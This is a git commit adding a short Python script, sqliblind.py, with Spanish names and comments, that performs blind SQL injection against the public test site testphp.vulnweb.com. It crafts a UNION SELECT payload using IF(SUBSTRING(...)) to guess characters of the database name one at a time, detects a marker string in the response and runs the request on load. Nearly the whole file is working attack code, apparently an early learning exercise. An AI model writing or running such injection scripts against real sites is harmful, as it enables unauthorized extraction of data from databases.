de704f488f012dc654595e094758b7a447f283a6
Juan <49064426+JuanPMC@users.noreply.github.com>
2020-12-17 16:22:29 +0100

    Juntado dos fnciones iniciales

--- sqliblind.py
+++ sqliblind.py
@@ -1,2 +1,26 @@
+# How to make http request
+import requests as req
+
+comprobador = "Si esite"
+
+def requestador(letra,busqueda,numero):
+    urlCrafteado = "http://testphp.vulnweb.com/artists.php?artist=1 and 1=0 union select 1,IF(SUBSTRING(" + busqueda + ","+ str(numero) + ","+str(numero)+") = \"" + letra + "\", \"Si esite\", \"NO esite\"),3"
+    r = req.get(urlCrafteado)
+    print(urlCrafteado)
+    return r.text
 
 
+
+def ysisi(webpage):
+
+    res = webpage.find(comprobador)
+
+    if res != -1:
+        return True
+    return False
+
+def main():
+    res = ysisi(requestador('b',"database()",1))
+    print(res)
+
+main()
